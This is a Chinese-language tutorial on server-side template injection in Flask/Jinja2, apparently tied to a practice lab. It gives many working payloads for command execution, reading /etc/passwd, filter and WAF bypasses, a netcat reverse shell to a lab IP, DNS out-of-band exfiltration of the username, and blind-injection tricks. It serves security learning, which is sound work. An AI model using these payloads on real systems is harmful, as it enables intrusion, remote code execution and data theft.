[TOC]

[X3NNY/sstilabs: A lab to help you learning SSTI (github.com)](https://github.com/X3NNY/sstilabs)

### SSTI简介

SSTI就是服务器模板注入 当前使用的一些框架，比如python的flask，php的tp，java的spring等一般都采用成熟的MVC的模式，用户 的输入先进入Controller控制器，然后根据请求类型和请求的指令发送给对应Model业务模型进行业务逻辑 判断，数据库存取，最后把结果返回给View视图层，经过模板渲染展示给用户。

漏洞成因就是服务端接收了用户的恶意输入以后，未经任何处理就将其作为 Web 应用模板内容的一部分， 模板引擎在进行目标编译渲染的过程中，执行了用户插入的可以破坏模板的语句，因而可能导致了敏感信息 泄露、代码执行、GetShell 等问题。其影响范围主要取决于模版引擎的复杂性。

凡是使用模板的地方都可能会出现 SSTI 的问题，SSTI 不属于任何一种语言，沙盒绕过也不是，沙盒绕过只 是由于模板引擎发现了很大的安全漏洞，然后模板引擎设计出来的一种防护机制，不允许使用没有定义或者 声明的模块，这适用于所有的模板引擎。

### 模板是什么

模板引擎（特指web开发的模板引擎）是为了使用户界面与业务数据（内容）分离而产生的，他可以生成特 定格式的文档，用于网站的模板引擎就会生成一个标准的HTML文档。 模板引擎会提供一套生成 HTML 代码的程序，然后只需要获取用户的数据，然后放到渲染函数里，然后生成 模板+用户数据的前端 HTML 页面，然后反馈给浏览器，呈现在用户面前。 它可以理解为一段固定好格式，等着你来填充信息的文件。通过这种方法，可以做到逻辑与视图分离，更容 易、清楚且相对安全地编写前后端不同的逻辑。

### 漏洞成因

ssti主要为python的一些框架 jinja2 mako tornado django，PHP框架smarty twig，java框架jade velocity 等等使用了渲染函数时，由于代码不规范或信任了用户输入而导致了服务端模板注入，模板渲染其实并没有 漏洞，主要是程序员对代码不规范不严谨造成了模板注入漏洞，造成模板可控。

### SSTI基础知识

##### Python-flask模板

Python-Flask使用Jinja2作为渲染引擎 （Jinja2.10.x Documention）

 jinja2是Flask作者开发的一个模板系统，起初是仿django模板的一个模板引擎，为Flask提供模板支持，由 于其灵活，快速和安全等优点被广泛使用。

在jinja2中，存在三种语法：

```
控制结构 {% %}，也可以用来声明变量（{% set c = "1" %}）
变量取值 {{ }}，比如输入 1+1，2*2，或者是字符串、调用对象的方法，都会渲染出执行的结果
{# ... #} 表示未包含在模板输出中的注释
在模板注入中，主要使用的是{{}} 和 {%%}
检测是否存在ssti
在url后面，或是参数中添加 {{ 6*6 }} ，查看返回的页面中是否有 36
```

jinja2模板中使用 {{ }} 语法表示一个变量，它是一种特殊的占位符。当利用jinja2进行渲染的时候，它会把这些特殊的占位符进行填充/替换，jinja2支持python中所有的Python数据类型比如列表、字段、对象等，被两个括号包裹的内容会输出其表达式的值。

###### 过滤器

jinja2中的过滤器可以理解为是jinja2里面的内置函数和字符串处理函数，用于修饰变量，甚至支持参数 `range(10)|join(', ')`；以及链式调用，只需要在变量后面使用管道符 `|` 分割，前一个过滤器的输出会作为后一个过滤器的输入，例如，`{{ name|striptags|title }}` 会移除 HTML Tags，并且进行 title-case 转化，这个过滤器翻译为 Python 的语法就是 `title(striptags(name))`。

###### 宏

jinja2中还有宏，宏允许你定义一组代码，并在模板中多次调用它，类似于函数。

使用 `macro` 关键字，并指定宏的名称和参数列表。然后，在模板中使用 `call` 关键字来调用宏，并传递相应的参数。

```jinja2
{% macro greet(name) %}
    Hello, {{ name }}!
{% endmacro %}

{{ greet("A") }}
{{ greet("B") }}
```

还能够设置默认参数

```jinja2
{% macro greet(name, greeting="Hello") %}
    {{ greeting }}, {{ name }}!
{% endmacro %}

{{ greet("A") }}
{{ greet("B", greeting="Hi") }}
```

宏还能够支持导入

```jinja2
{% import 'form.html' as form %}}
{{ form.greet("B", greeting="Hi") }}
```

还有一种调用方法，`call`，`macro` 有一个隐含参数 `caller`，其作用是返回 `call` 块中间的内容

```jinja2
{% macro foo(name) -%}
    <div>{{ name ~ " says: " ~ caller() }}</div>
{%- endmacro %}

{% call foo("wi1shu") %}
    你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好
{% endcall %}
```

>值得注意的是，如果不想传递 `caller` 中的内容，也需要在 `macro` 中调用 `caller()`，否则会报错：
>
>TypeError: macro ‘foo’ was invoked with two values for the special caller argument. This is most likely a bug.

###### 模板继承

模板继承允许我们创建一个骨架文件，其他文件从该骨架文件继承。并且还支持针对自己需要的地方进行修改。

jinja2 的骨架文件中，利用 `block` 关键字表示其包涵的内容可以进行修改。

base.html

```html
<head>
    {% block head %}
    <title>{% block title %}{% endblock %} - World</title>
    {% endblock %}
</head>

<body>
    <div id="content">{% block content %}{% endblock %}</div>
    <div id="footer">
        {% block  footer %}
        <script>This is javascript</script>
        {% endblock %}
    </div>
</body>
```

sub.html继承base.html的模板：

```html
{% extends "base.html" %}  <!-- 继承 -->

{% block title %} Hello {% endblock %}  <!-- title 自定义 -->

{% block head %}
    {{ super() }}  <!-- 用于获取原有的信息 -->
    <style type='text/css'>
    .important { color: #FFFFFF }
    </style>
{% endblock %}   
 
<!-- 其他不修改的原封不动的继承 -->
```

渲染：

```python
from jinja2 import FileSystemLoader, Environment

env = Environment(loader=FileSystemLoader("./"))
print(env.get_template("sub.html").render())
```

这里用到了 `FileSystemLoader`，其实用它的逻辑很简单。我们在 bbb.html 中写了 `{% extends "base.html" %}`，那 jinja2 怎么知道 base.html 在哪呢？`FileSystemLoader` 就是用来指定模板文件位置的。同样用途的还有 `PackageLoader`，它是用来指定搜索哪个 Python 包下的模板文件

##### Python中的一些 Magic Method

在Python中，所有以“”双下划线包起来的方法，都统称为“Magic Method”，中文称『魔术方法』,例如类的 初始化方法`__init__`

一些做SSTI类题目时常用的属性和方法

```
属性
__class__：用于获取当前对象所对应的类
__base__：用于获取该类的直接父类（基类）
__bases__：返回一个类直接所继承的类（元组形式）
__mro__：返回一个类所继承的所有类
__dict__：返回当前类的函数、全局变量、属性等
__init__：用于将对象实例化，所有类都具有 __init__ 方法，便于利用它来作为跳板访问 __globals__
__globals__：function.__globals 用于获取function所处空间下可使用的module、方法以及所有变量
__builtins__：获取python内置的方法比如ord、chr等
方法
__subclasses__：返回该类的所有直接子类
__import__：动态加载类和函数，也就是导入模块，经常用于导入os模块
__getattribute__：在访问对象的属性时进行自定义处理。无论对象中的属性是否存在，只要访问对象的属性，就会无条件进入
__getattr__：访问对象中不存在的属性时进行处理。当对象中没有被访问的属性时，Python解释器会自动调用该方法
```

#### 常用注入模块

爆破需要的模块的EXP：

```Python
import requests
from lxml import html

headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.110 Safari/537.36',
}

url = "http://192.168.159.128:50000/level/1"

NUM = 500

if __name__ == "__main__":

    # # 查找类
    # find_class = "importlib"
    # for i in range(NUM):
    #
    #     data_class1 = {
    #         'code': "{{().__class__.__bases__[0].__subclasses__()[%d]}}" % i
    #     }
    #
    #     res = requests.post(url=url, data=data_class1, headers=headers)
    #     if find_class in res.text:
    #         tree = html.fromstring(res.text)
    #         print(str(i) + " -> " + tree.text)

    # 查找类方法
    find_method = "load_module"
    for i in range(NUM):

        data_method = {
            'code': "{{().__class__.__bases__[0].__subclasses__()[%d].__init__.__globals__}}" % i
        }

        data_class = {
            'code': "{{().__class__.__bases__[0].__subclasses__()[%d]}}" % i
        }

        res = requests.post(url=url, data=data_method, headers=headers)
        if find_method in res.text:
            res2 = requests.post(url=url, data=data_class, headers=headers)
            tree = html.fromstring(res2.text)
            print(str(i) + " -> " + tree.text)

    # # 查看内置函数
    # for i in range(NUM):
    #     data_builtins = {
    #         'code': "{{().__class__.__bases__[0].__subclasses__()[%i].__init__.__globals__['__builtins__']}}" % i
    #     }
    #
    #     res3 = requests.post(url=url, data=data_builtins, headers=headers)
    #     if res3.text != "Hello " and res3.text != "No this level":
    #         print(html.fromstring(res3.text).text.replace("\n", "【回车】"))
    #         break

    # # 查看某个类的__globals__
    # data_globals = {
    #     'code': "{{().__class__.__bases__[0].__subclasses__()[" + str(133) + "].__init__.__globals__}}"
    # }
    #
    # res3 = requests.post(url=url, data=data_globals, headers=headers)
    # if res3.text != "Hello " and res3.text != "No this level":
    #     print(html.fromstring(res3.text).text.replace("\n", "【回车】"))

```

![](https://github.com/wi1shu7/day_day_up/blob/main/daydayup.assets/image-20230729181809015.png)

```
<class 'os._wrap_close'>类：
利用popen()执行命令：().__class__.__bases__[0].__subclasses__()[133].__init__.__globals__['popen']('whoami').read()
利用system()执行命令：().__class__.__bases__[0].__subclasses__()[133].__init__.__globals__['system']('ping 78319.UOFOS5Q7RU.dns.xms.la')

通过__builtins__获取内置方法，能够调用__builtins__即可，测试很多类都能够调用：
利用eval()执行命令：().__class__.__bases__[0].__subclasses__()[465].__init__.__globals__['__builtins__']['eval']('__import__("os").popen("cat ./flag").read()')
通过open()查看flag：().__class__.__bases__[0].__subclasses__()[465].__init__.__globals__['__builtins__']['open']('./flag', 'r').read()

<class 'subprocess.Popen'>类：
利用subprocess.run()执行命令：().__class__.__bases__[0].__subclasses__()[396].__init__.__globals__['run']('whoami', capture_output=True, text=True).stdout
利用subprocess.Popen()执行命令：().__class__.__bases__[0].__subclasses__()[396].__init__.__globals__['Popen'](["touch", "./456"])

<class '_frozen_importlib.BuiltinImporter'>类：
利用load_module()加载模块os进行执行命令：().__class__.__bases__[0].__subclasses__()[84]['load_module']("os")["popen"]("ls").read()

利用linecache函数执行命令，有几个类都有这个函数：
linecache()这个函数中也引入了os模块：().__class__.__bases__[0].__subclasses__()[259].__init__.__globals__['linecache'].os.popen('dir').read()

<class '_frozen_importlib_external.FileLoader'>类：
通过get_data函数读取文件内容：().__class__.__bases__[0].__subclasses__()[94]["get_data"](0, "/etc/passwd")

os模块执行命令:
通过config，调用os模块：config.__class__.__init__.__globals__['os'].popen('whoami')
通过url_for，调用os：{url_for.__globals__.os.popen('whoami').read()
在已经加载os模块的子类里直接调用os模块：''.__class__.__bases__[0].__subclasses__()[341].__init__.__globals__['os'].popen("ls -l").read()
```

`subprocess.Popen()`![](https://github.com/wi1shu7/day_day_up/blob/main/daydayup.assets/image-20230729180632010.png)

`os.system()`
![](https://github.com/wi1shu7/day_day_up/blob/main/daydayup.assets/image-20230729182735682.png)

`linecache()`执行命令
![](https://github.com/wi1shu7/day_day_up/blob/main/daydayup.assets/image-20230729191643448.png)

![](https://github.com/wi1shu7/day_day_up/blob/main/daydayup.assets/image-20230729192011745.png)

解析`{{().__class__.__bases__[0].__subclasses__()[%i].__init__.__globals__['__builtins__']}}`
![](https://github.com/wi1shu7/day_day_up/blob/main/daydayup.assets/image-20230729184733593.png)

>`__class__.__base__.__subclasses__()` 列表中通常不会包含 `file` 类的子类，因为在 Python 3 中，`file` 类已经被移除，不再是内置类型。
>
>在早期版本的 Python（Python 2.x）中，`file` 类用于表示文件对象，并作为内置的文件 I/O 类型。但从 Python 3 开始，`file` 类被替代为内置的 `io` 模块中的 `io.TextIOWrapper` 和 `io.BufferedIOBase` 等类。
>
>在 Python 3 中，文件 I/O 操作应该使用 `open()` 函数来打开文件，而不是直接使用 `file` 类。`open()` 函数返回一个文件对象，它是 `io.TextIOWrapper` 或 `io.BufferedIOBase` 的实例，可以用于进行文件读写操作。

>```
><class '_frozen_importlib.BuiltinImporter'>类：
>利用load_module()加载模块os进行执行命令：().__class__.__bases__[0].__subclasses__()[84]['load_module']("os")["popen"]("ls").read()
>```
>
>这里的`load_module`是一个静态方法，所以能够直接通过类调用而不用实例化对象

#### {% %}使用

{% %}是属于flask的控制语句，且以{% end.. %}结尾，可以通过在控制语句，定义变量或者写循环，判断。

index.html

```html
<!DOCTYPE html>
<html>
<head>
    <title>{{ title }}</title>
</head>
<body>
    <h1>{{ heading }}</h1>
    <ul>
        {% for item in items %}
			{% if item == "wi1shu" %}
				<li>This is {{ item }}</li>
			{% else %}
				<li>{{ item }}</li>
			{% endif %}
        {% endfor %}
    </ul>
</body>
</html>
```

app.py

```python
from flask import Flask, render_template
from jinja2 import Template

app = Flask(__name__)


@app.route('/')
def main():
    return render_template('index.html', title='My Page', heading='Welcome to My Page', items=['Apple', 'Banana', 'Orange'])


if __name__ == '__main__':
    app.run(host='127.0.0.1', port=50000)
```

设置变量

```jinja2
{% set a = 'Apple' %}
{{ a }}
```

利用方式

由于模板语法对 Python 语句是有一定程度支持的，所以可以这样利用：

```python
@app.route('/demo1/')
def demo1():
    payload = Template('''
        {% for i in ''.__class__.__mro__[-1].__subclasses__() if i.__name__ == "_wrap_close" %}
            {% set wi1 = i.__init__.__globals__['popen']('whoami').read() %} 
            {{wi1}}
        {% endfor %}
    ''').render()
    return payload
```

但并不是完全支持 Python 所有的语法，所以很多语法是无法使用的，比如列表推导式

```python
try:
    print(Template('''
        {{ [i for i in ''.__class__.__mro__[-1].__subclasses__() if i.__name__ == "_wrap_close"][0].__init__.__globals__['system']('whoami') }}
        ''').render())
except Exception:
    print(traceback.format_exc())
```

会报错：`jinja2.exceptions.TemplateSyntaxError: expected token ',', got 'for'`

### waf绕过

#### 绕过数字、字符

沙箱逃逸中的`[ ]` 扣字符拼接、`chr` 等。

1. 数字 0：`{{ {}|int }}`、`{{ {}|length }}`
2. 数字 1：`{{ ({}|int)**({}|int) }}`
3. 数字 2：`dict(e='a',a=1)|join|count`
4. 理论上有了 1 之后就可以搞出所有其他数字，可以用 `+` 或者是 `-`+`|abs`
5. 空格：`{{ {}|center|last }}`、`{1:1}|xmlattr|first`
6. `<`：`{}|select|string|first`
7. `>`：`{}|select|string|last`
8. 点：`{{ self|float|string|min }}` 或者 `c.__lt__|string|truncate(3)|first`
9. `a-z`：`{{ range.__doc__ + dict.__doc__}}`
10. `A-Z`：`{{ (range.__doc__ + dict.__doc__) | upper }}`

上面这种都比较常规，思路还是扣字符的思路，顶多是过滤器做了变化。

这里多说一下利用格式化字符串实现的任意字符构造（例如字符 `d`）：

1. 首先搞出 `%c`：`{{ {}|string|urlencode|first~(self|string)[16] }}`
2. 然后搞出 `d`：`{{ ({}|string|urlencode|first~(self|string)[16]) % 100 }}`

还不需要引号。

>`__lt__` 是Python中用于比较“小于”操作的特殊方法名。
>
>`<bound method Undefined._fail_with_undefined_error of Undefined>`：这个错误信息是由Jinja2模板引擎的Undefined对象引起的。当在模板中引用了一个未定义的变量或对象时，Jinja2会将其表示为Undefined对象，以便在模板渲染过程中进行处理。
>
>`truncate()` 过滤器用于截断字符串并添加省略号。它可以将一个较长的字符串截断为指定的长度，并在截断处添加省略号以表示字符串被截断了。
>
>`{{"Hello, World!"|truncate(6)}}` -> `Hel...`

>`xmlattr()` 是Jinja2中的一个过滤器，用于将字典中的键值对转换为XML属性字符串。
>
>```python
>person = {
>    'name': 'Alice',
>    'age': 30
>}
>```
>
>`<person {{ person|xmlattr }}>...</person>` 渲染后-> `<person name="Alice" age="30">...</person>`

>`self`：在Jinja2模板中，`self` 表示当前上下文中的对象。`self` 只在自定义过滤器和函数中可用，而在模板中不可用。在模板中，可以直接引用传递给模板的变量和上下文中的属性。

>`~` 是字符串拼接运算符。它用于连接两个字符串并生成一个新的字符串。
>
>![](https://github.com/wi1shu7/day_day_up/blob/main/daydayup.assets/image-20230803023115250.png)

或者还有借助`request`对象，`request.args` 是flask中的一个属性,为返回请求的参数,这里把 path 当作变量名,将后面的路径传 值进来,进而绕过了引号的过滤

`{{ ().__class__.__bases__.__getitem__(0).__subclasses__().pop(40) (request.args.path).read() }}&path=/etc/passwd`

`request`还有以下几种

```
request.args.name
request.cookies.name
request.headers.name
request.values.name
request.form.name
```

payload如下

GET方式，利用request.args传递参数

`{{().__class__.__bases__[0].__subclasses__()[213].__init__.__globals__.__builtins__[request.args.arg1](request.args.arg2).read()}}`
``&arg1=open&arg2=/etc/passwd`
POST方式，利用request.values传递参数

`{{().__class__.__bases__[0].__subclasses__()[40].__init__.__globals__.__builtins__[request.values.arg1](request.values.arg2).read()}}`
`post:arg1=open&arg2=/etc/passwd`
Cookie方式，利用request.cookies传递参数

`{{().__class__.__bases__[0].__subclasses__()[40].__init__.__globals__.__builtins__[request.cookies.arg1](request.cookies.arg2).read()}}``
``Cookie:arg1=open;arg2=/etc/passwd`

#### 获取内置函数

列如获取`chr`

```
{{().__class__.__base__.__subclasses__()[100].__init__.__globals__["__builtins__"]["chr"]}}
```

如果你觉得每次调用都需要这样写，太麻烦了，payload 也冗余，那么就可以结合 `{% set ... %}`：

```
{% set chr = ().__class__.__base__.__subclasses__()[100].__init__.__globals__["__builtins__"]["chr"]%}

{{ chr(97)~chr(98) }}
```

结合宏：

```
{%- macro chr(i) -%}
    {{().__class__.__base__.__subclasses__()[100].__init__.__globals__["__builtins__"]["chr"](i)}}
{%- endmacro -%}

{{ chr(97)~chr(98) }}
```

由于 jinja2 中有自己的一些内置变量等，所以会有一些资料 2 之外的姿势。例如利用 `Undefined` 实例可以直接拿到 `__globals__`：

```
{{ x.__init__.__globals__ }}
```

![](https://github.com/wi1shu7/day_day_up/blob/main/daydayup.assets/image-20230803172419855.png)

所以就可以有：

- `x.__init__.__globals__.__builtins__`
- `x.__class__.__init__.__globals__.__builtins__.eval`
- `x.__init__.__globals__.__builtins__.eval`
- `x.__init__.__globals__.__builtins__.exec`
- `x.__init__.__globals__.sys.modules.os`
- `x.__init__.__globals__.__builtins__.__import__`
- ...

通过查阅源码或者文档可知，默认命名空间自带这几种函数

![](https://github.com/wi1shu7/day_day_up/blob/main/daydayup.assets/image-20230803173842159.png)

或者用 `self.__dict__._TemplateReference__context` 也可以看到。

![](https://github.com/wi1shu7/day_day_up/blob/main/daydayup.assets/image-20230803173407425.png)

所以就有：

1. `self.__init__.__globals__`
2. `lipsum.__globals__.os`
3. `cycler.__init__.__globals__.os`
4. `joiner.__init__.__globals__.os`
5. `namespace.__init__.__globals__.os`

其实这些随便找个方法都可以搞到 `__globals__`。那为啥其他的比如 `range` 就不可以呢？

>我给出的解释：`range`是Python的内置函数，在Python的C语言实现中被定义
>
>`__globals__`是一个特殊的属性，是Python函数特有的。它是函数对象的一个内部属性，是一个字典，包含了函数被定义时的全局命名空间。这个命名空间包含了函数能够访问的所有全局变量。
>
>`__globals__`对于内置函数如`range`是不可用的，因为它们是在C语言级别实现的，而不是Python代码。对于内置的C语言函数，或者其他非函数对象，这个属性是不存在的。
>
>`range`，`dict`等是Python的内置函数，它们在Python的C语言实现中被定义，因此它们没有`__globals__`属性。
>
>而`generate_lorem_ipsum`，`Cycler`，`Joiner`，`Namespace`等是Python代码定义的函数或类，它们在定义时会捕获全局命名空间，因此有`__globals__`属性。
>
>![](https://github.com/wi1shu7/day_day_up/blob/main/daydayup.assets/image-20230803180406037.png)

#### 过滤`.`

在Python沙箱逃逸中，过滤了 `.`，用 `getattr()`

在 jinja2 中，由于 `[key]` 的特殊性，`[key]` 和 `.` 是基本上等价的，只是处理逻辑先后上有区别，`.` 是先按查找属性执行，再按照用键查字典的值去执行，`[key]` 则相反。并且还提到，如果想查找属性还可以用 `attr()`。

- `{{ 1["__class__"] }}`
- `{{ 1 | attr("__class__") }}`

由于过滤器 `map` 也支持取属性，所以可以这样

```
# 注意，由于 map 需要一个可迭代对象，所以外面需要套个 [ ]
# 当使用 map 过滤器时，可以通过 attribute 参数来指定要调用的属性或方法。
{{ [1] | map(attribute="__class__")| list | first }}

{{ [1, [], '', (), {}] | map(attribute="__class__")| list }}
# [<class 'int'>, <class 'list'>, <class 'str'>, <class 'tuple'>, <class 'dict'>]
```

#### 过滤`[]`

*[这里](#过滤[])

除了这里的之外，在取字典里的数据的时候，也可以根据上述的结论，用`.`代替`[]`也可以`{{ {"a": 1}.a }}`

如果是要构造一个列表，我们一般是给最外面加个 `[]` 就好了。在中括号被过滤的情况下，则可以使用 `slice` 来替代。例如 `"1"|slice(1)|list` 与 `[['1']]` 是等价的。

>`slice(value,slices,fill_width=None)`：切片,接受一个可迭代对象,返回slices指定份数,不足n个使用fill_width指定的对象进行填充
>
>- slice() 过滤器可以切割迭代器(比如列表),返回二维列表。
>- 传入切割份数量(这里是3),可以将迭代器均分为多份。
>- 在循环中可以迭代这些份,实现分列展示等效果。
>- 第二个参数用于填充最后一列缺失数据。
>
>```jinja2
>{% set my_list = [1, 2, 3, 4, 5] %}
>{{ my_list|slice(4)|list }}
># [[1, 2], [3], [4], [5]]
>
>{% set my_list = [1, 2, 3, 4, 5] %}
>{{ my_list|slice(3)|list }}
># [[1, 2], [3, 4], [5]]
>
>{{ 'abcdefghijklmn'|slice(6)|list }}
># [['a', 'b', 'c'], ['d', 'e', 'f'], ['g', 'h'], ['i', 'j'], ['k', 'l'], ['m', 'n']]
>
>{{ 'abcdefghijklmn'|slice(20)|list }}
># [['a'], ['b'], ['c'], ['d'], ['e'], ['f'], ['g'], ['h'], ['i'], ['j'], ['k'], ['l'], ['m'], ['n'], [], [], [], [], [], []]
>
>{{ 'abcdefghijklmn'|slice(20) }}
># <generator object sync_do_slice at 0x000001CD94C3B7B0>
>```

####  过滤 `{{ }}`

利用 `{% %}`。

首先是`{% macro %}`

`{% print(...) %}`：

```
{% print(''.__class__.__mro__[-1].__subclasses__()[135].__init__.__globals__['popen']("whoami")).read() %}
```

还有 `{% if %}`、`{% set %}`、`{% for %}` ... 都是可以执行命令的，只是无回显。如果非要有回显，可以外带数据，或者盲注，或者直接反弹shell

外带数据：

```jinja2
 {% for subclass in dict.mro()[-1].__subclasses__()%}
    {% if subclass.__name__ == '_wrap_close' %}
        {%set a = subclass.__init__.__globals__.popen('ping %USERNAME%.0JV612R1Y5.dns.xms.la').read()%}
    {% endif %}
 {% endfor %}
```

![](https://github.com/wi1shu7/day_day_up/blob/main/daydayup.assets/image-20230803202623360.png)

>windows常用变量：
>
>- //变量                              类型    描述
>- //%ALLUSERSPROFILE%              本地    返回“所有用户”配置文件的位置。
>- //%APPDATA%          　           本地    返回默认情况下应用程序存储数据的位置。
>- //%CD%                            本地    返回当前目录字符串。
>- //%CMDCMDLINE%                   本地    返回用来启动当前的 Cmd.exe 的准确命令行。
>- //%CMDEXTVERSION%               系统    返回当前的“命令处理程序扩展”的版本号。
>- //%COMPUTERNAME%               系统    返回计算机的名称。
>- //%COMSPEC%                      系统    返回命令行解释器可执行程序的准确路径。
>- //%DATE%                          系统    返回当前日期。使用与 date /t 命令相同的格式。由 Cmd.exe 生成。有关 date 命令的详细信息，请参阅 Date。
>- //%ERRORLEVEL%                   系统    返回上一条命令的错误代码。通常用非零值表示错误。
>- //%HOMEDRIVE%                    系统    返回连接到用户主目录的本地工作站驱动器号。基于主目录值而设置。用户主目录是在“本地用户和组”中指定的。
>- //%HOMEPATH%                     系统    返回用户主目录的完整路径。基于主目录值而设置。用户主目录是在“本地用户和组”中指定的。
>- //%HOMESHARE%                   系统    返回用户的共享主目录的网络路径。基于主目录值而设置。用户主目录是在“本地用户和组”中指定的。
>- //%LOGONSERVER%                 本地    返回验证当前登录会话的域控制器的名称。
>- //%NUMBER_OF_PROCESSORS%      系统    指定安装在计算机上的处理器的数目。
>- //%OS%                            系统    返回操作系统名称。Windows 2000 显示其操作系统为 Windows_NT。
>- //%PATH%                          系统    指定可执行文件的搜索路径。
>- //%PATHEXT%                       系统    返回操作系统认为可执行的文件扩展名的列表。
>- //%PROCESSOR_ARCHITECTURE%    系统    返回处理器的芯片体系结构。值：x86 或 IA64（基于 Itanium）。
>- //%PROCESSOR_IDENTFIER%        系统    返回处理器说明。
>- //%PROCESSOR_LEVEL%            系统    返回计算机上安装的处理器的型号。
>- //%PROCESSOR_REVISION%         系统    返回处理器的版本号。
>- //%PROMPT%                       本地    返回当前解释程序的命令提示符设置。由 Cmd.exe 生成。
>- //%RANDOM%                      系统    返回 0 到 32767 之间的任意十进制数字。由 Cmd.exe 生成。
>- //%SYSTEMDRIVE%                 系统    返回包含 Windows server operating system 根目录（即系统根目录）的驱动器。
>- //%SYSTEMROOT%                 系统    返回 Windows server operating system 根目录的位置。
>- //%TEMP%和%TMP%                系统和用户 返回对当前登录用户可用的应用程序所使用的默认临时目录。有些应用程序需要 TEMP，而其他应用程序则需要 TMP。
>- //%TIME%                          系统    返回当前时间。使用与time /t命令相同的格式。由Cmd.exe生成。有关time命令的详细信息，请参阅 Time。
>- //%USERDOMAIN%                  本地    返回包含用户帐户的域的名称。
>- //%USERNAME%                    本地    返回当前登录的用户的名称。
>- //%USERPROFILE%                 本地    返回当前用户的配置文件的位置。
>- //%WINDIR%                       系统    返回操作系统目录的位置。

反弹shell：

*[这里](#反弹shell)

```
{% for subclass in dict.mro()[-1].__subclasses__()%}
    {% if subclass.__name__ == '_wrap_close' %}
        {% set a = subclass.__init__.__globals__.popen("netcat 192.168.159.128 5478 -e /bin/bash") %}
    {% endif %}
 {% endfor %}
```

盲注：

布尔盲注

```
{% if dict.mro()[-1].__subclasses__()[134].__init__.__globals__.popen('whoami').read()[0] == "a" %}a{% endif %}
{% if dict.mro()[-1].__subclasses__()[134].__init__.__globals__.popen('whoami').read()[0] == "b" %}b{% endif %}
{% if dict.mro()[-1].__subclasses__()[134].__init__.__globals__.popen('whoami').read()[0] == "d" %}d{% endif %}
# 输出d 说明第一个字符是d
```

时间盲注

```
{% if dict.mro()[-1].__subclasses__()[133].__init__.__globals__.system('sleep $(whoami | cut -c 1 | tr a 2)') %}{% endif %}
{% if dict.mro()[-1].__subclasses__()[133].__init__.__globals__.system('sleep $(whoami | cut -c 1 | tr b 2)') %}{% endif %}
...
{% if dict.mro()[-1].__subclasses__()[133].__init__.__globals__.system('sleep $(whoami | cut -c 1 | tr s 2)') %}{% endif %}
# 延时 2s 说明第一个字符是 s
```

>1. `cut -c 1`: `cut` 是一个文本处理工具，`-c` 选项用于按字符进行切割。这里 `-c 1` 表示只取每行的第一个字符。
>2. `tr a 1`: `tr` 是另一个文本处理工具，用于字符替换。`a` 被替换成 `2`，意味着如果用户名的首字母是小写字母 `a`，那么它会被替换成数字 `2`。
>3. `sleep $(...)`: 这是 `sleep` 命令，用于让程序休眠一段时间。`$()` 是命令替换的语法，它会先执行括号中的命令，然后将结果作为参数传递给 `sleep` 命令。在这里，`sleep` 命令将等待的时间设置为之前处理后的结果。

甚至可以搞基于报错的盲注：

```
{% for i in [1][(dict.mro()[-1].__subclasses__()[133].__init__.__globals__.popen('whoami').read()[0] == "a")|int] %}{% endfor %}

{% for i in [1][(dict.mro()[-1].__subclasses__()[133].__init__.__globals__.popen('whoami').read()[0] == "s")|int] %}{% endfor %}
# 不报错说明第一个字符是 s
```

因为对于 jinja2 来说，索引过大是返回 Undefined，不会报错。

![](https://github.com/wi1shu7/day_day_up/blob/main/daydayup.assets/image-20230803220454065.png)

#### 限制过滤器或函数

姿势主要有三种：

1. 有些过滤器是可以被替换的，比如 `[]|string` 等同于 `[]|format`。这种方式主要依赖于使用过滤器的目的，不太好列出统一的替换规则，所以我就不一一列举了。熟悉各种过滤器的作用是这种 bypass 的前提。

2. 大部分过滤器可以转为 `[]` 嵌套 + `map()` 来使用。例如 `123|string` 等同于 `[123]|map("str""ing")|list|last`。这种姿势相对来说通用，遗憾的是，无法带参数使用过滤器。

   >`map()` ：它可以将一个函数或过滤器映射到一个序列或对象列表上。
   >
   >`map()`的基本语法是:
   >
   >```
   >{{ sequence|map(attribute) }}
   >
   >{{ sequence|map('filtername') }}
   >```
   >
   >`map()`有两种主要用法:
   >
   >- 查找属性:
   >
   >```
   >{% set users = [user1, user2, user3] %}
   >{{ users|map(attribute='username') }}
   >```
   >
   >这将提取每个user对象的username属性,返回一个username的列表。
   >
   >- 应用过滤器:
   >
   >```
   >{{ titles|map('lower') }}
   >```
   >
   >这将lower过滤器应用到titles序列的每个元素上。
   >
   >map()通常结合join等过滤器处理结果:
   >
   >```
   >{{ users|map(attribute='username')|join(', ') }}
   >```

3. `self.__dict__._TemplateReference__context` 中包含了内置的全局函数，可以直接用

4. 拼接

   ```python
   {{().__class__.__bases__[0].__subclasses__()[133].__init__.__globals__['popen']('who'+'ami').read()}}
   {{().__class__.__bases__[0].__subclasses__()[133].__init__.__globals__['po'+'pen']('who'+'ami').read()}}
   ```

   Unicode编码

   ```python
   {{().__class__.__bases__[0].__subclasses__()[133].__init__.__globals__['\u0070\u006f\u0070\u0065\u006e']('\u0077\u0068\u006f\u0061\u006d\u0069').read()}}
   ```

   十六进制编码

   ```python
   {{().__class__.__bases__[0].__subclasses__()[133].__init__.__globals__['\x70\x6f\x70\x65\x6e']('\x77\x68\x6f\x61\x6d\x69').read()}}
   ```

   引号绕过

   ```python
   {{().__class__.__bases__[0].__subclasses__()[133].__init__.__globals__['pope''n']('wh''oami').read()}}
   ```

   利用dict绕过

   ```python
   {{dict(__in=a,it__=a)|join}}  =__init_
   ```

   例如 `whoami`：

   - `{{ dict(whoami=x)|join }}`
   - `{{ dict(who=x,ami=x)|join }}`
   - `{{ dict(whoami=x)|list|first }}`
   - `{{ dict(whoami=x)|items|list|first|first }}`

#### py3.9新特性

>`<class 'types.GenericAlias'>` 是 Python 3.9 中引入的一个新的类型，用于表示泛型别名。
>
>在 Python 3.9 之前，泛型的类型注解是使用 `typing` 模块中的类和类型变量来实现的。例如，你可以使用 `List[int]` 表示整数列表，或者 `Dict[str, int]` 表示键为字符串、值为整数的字典。
>
>然而，Python 3.9 引入了新的泛型类型系统，使用 `types.GenericAlias` 类来表示泛型别名。这个类的作用是创建一个通用的别名，可以用来表示各种不同的泛型类型。
>
>例如，`list[int]` 在 Python 3.9 中将被表示为 `<class 'types.GenericAlias'>`。
>
>下面是一个例子，演示如何在 Python 3.9 中使用泛型别名：
>
>```
>from __future__ import annotations
>from typing import List
>
># 在 Python 3.9 中，List[int] 将被表示为 <class 'types.GenericAlias'>
>my_list: List[int] = [1, 2, 3]
>
>print(type(my_list))
>```
>
>输出将会是：
>
>```
><class 'list'>
>```
>
